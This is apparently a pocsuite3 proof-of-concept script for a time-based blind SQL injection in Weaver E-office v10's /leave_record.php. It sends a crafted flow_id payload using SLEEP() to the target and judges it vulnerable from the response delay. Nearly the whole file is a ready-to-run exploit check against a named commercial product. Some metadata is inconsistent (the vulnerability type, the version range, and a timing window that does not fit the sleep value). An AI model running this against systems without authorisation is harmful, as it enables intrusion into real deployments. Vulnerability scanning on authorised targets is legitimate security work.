from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 E-office v10 /leave_record.php 存在SQL注入漏洞'
    appName = '泛微 E-office'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''上海泛微网络科技股份有限公司E-office10版本/leave_record.php存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        base_path = '/eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1&table_field=1&table_field_name=user()&max_rows=10'
        base_url = self.url+base_path
        base_resp = requests.get(url=base_url, headers=headers, verify=False, allow_redirects=False, timeout=10)
        base_time = base_resp.elapsed.total_seconds()
        if base_resp.status_code == 200 and '<div class="empty-tip">' in base_resp.text:
            injecr_path = '''/eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1')+AND+(SELECT+5897+FROM+(SELECT(SLEEP(2.5)))QWhi)%23&table_field=1&table_field_name=user()&max_rows=10'''
            inject_url = self.url+injecr_path
            inject_resp = requests.get(url=inject_url, headers=headers, verify=False, allow_redirects=False, timeout=10)
            inject_time = inject_resp.elapsed.total_seconds()
            if (inject_time - base_time) >= 4.5 and (inject_time - base_time) <= 5.5 and ('<th title="user()">user()' in inject_resp.text or '<p>未找到相关数据</p>' in inject_resp.text):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = inject_url
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
